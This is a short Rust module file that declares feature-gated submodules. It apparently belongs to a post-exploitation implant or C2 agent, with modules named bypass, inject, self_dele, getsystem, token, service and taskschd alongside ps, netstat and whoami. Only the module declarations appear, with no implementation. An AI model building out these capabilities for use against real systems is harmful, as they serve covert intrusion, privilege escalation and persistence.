#[cfg(feature = "env")]
pub mod env;
#[cfg(debug_assertions)]
pub mod example;
#[cfg(feature = "netstat")]
pub mod netstat;
#[cfg(feature = "ps")]
pub mod ps;
#[cfg(feature = "whoami")]
pub mod whoami;
// mod reg;
#[cfg(feature = "kill")]
pub mod kill;
// mod spawn;
#[cfg(feature = "info")]
pub mod info;

#[cfg(all(target_family = "windows", feature = "bypass"))]
pub mod bypass;
#[cfg(all(target_family = "windows", feature = "inject"))]
pub mod inject;
#[cfg(all(target_family = "windows", feature = "registry"))]
pub mod reg;
#[cfg(all(target_family = "windows", feature = "self_dele"))]
pub mod self_dele;
#[cfg(all(target_family = "windows", feature = "service"))]
pub mod service;
#[cfg(all(target_family = "windows", feature = "taskschd"))]
pub mod taskschd;
#[cfg(feature = "thread_spawn_test")]
pub mod thread_spawn_test;
#[cfg(all(
    target_family = "windows",
    any(
        feature = "runas",
        feature = "rev2self",
        feature = "privs",
        feature = "getsystem"
    )
))]
pub mod token;
#[cfg(all(target_family = "windows", feature = "wmi"))]
pub mod wmi;
